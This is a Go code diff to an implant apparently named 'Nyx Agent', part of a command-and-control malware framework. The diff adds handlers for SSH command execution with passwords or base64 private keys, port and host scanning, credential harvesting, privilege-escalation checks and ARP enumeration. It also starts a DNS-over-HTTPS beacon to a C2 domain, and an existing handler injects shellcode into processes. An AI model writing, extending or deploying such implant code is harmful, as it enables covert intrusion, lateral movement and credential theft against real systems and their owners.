@@ -322,6 +322,60 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	case "ssh-exec":
+		// usage: ssh-exec <host:port> <user> <pass> <command>
+		sshParts := strings.SplitN(arg, " ", 4)
+		if len(sshParts) < 4 {
+			return "usage: ssh-exec <host:port> <user> <pass> <command>", "failed"
+		}
+		return sshExec(sshParts[0], sshParts[1], sshParts[2], sshParts[3])
+
+	case "ssh-key-exec":
+		// usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>
+		sshParts := strings.SplitN(arg, " ", 4)
+		if len(sshParts) < 4 {
+			return "usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>", "failed"
+		}
+		keyPEM, err := base64.StdEncoding.DecodeString(sshParts[2])
+		if err != nil {
+			return "base64 decode of key failed: " + err.Error(), "failed"
+		}
+		return sshKeyExec(sshParts[0], sshParts[1], string(keyPEM), sshParts[3])
+
+	case "portscan":
+		scanParts := strings.SplitN(arg, " ", 2)
+		host := ""
+		ports := ""
+		if len(scanParts) >= 1 {
+			host = scanParts[0]
+		}
+		if len(scanParts) >= 2 {
+			ports = scanParts[1]
+		}
+		return portScan(host, ports)
+
+	case "hostscan":
+		return hostDiscover(strings.TrimSpace(arg))
+
+	case "creds":
+		return harvestCreds()
+
+	case "privesc":
+		return privescCheck()
+
+	case "arp":
+		var out string
+		var err error
+		if runtime.GOOS == "windows" {
+			out, err = executeShell("arp -a")
+		} else {
+			out, err = executeShell("arp -a 2>/dev/null || ip neigh show")
+		}
+		if err != nil {
+			return out, "failed"
+		}
+		return out, "completed"
+
 	case "inject":
 		// usage: inject <pid> <shellcode_base64>
 		injParts := strings.SplitN(arg, " ", 2)
@@ -506,6 +560,7 @@ func main() {
 	fmt.Println("[*] Nyx Agent v0.3.0 starting...")
 
 	var agentID string
+	var dohStarted bool
 	sleepSeconds := 5
 	jitterSeconds := 1
 
@@ -518,6 +573,11 @@ func main() {
 		}
 
 		agentID = resp.AgentID
+
+		if !dohStarted && DohVar != "" && C2Domain != "" {
+			dohStarted = true
+			go runDohBeacon(agentID)
+		}
 
 		if s, err := strconv.Atoi(resp.Sleep); err == nil {
 			sleepSeconds = s
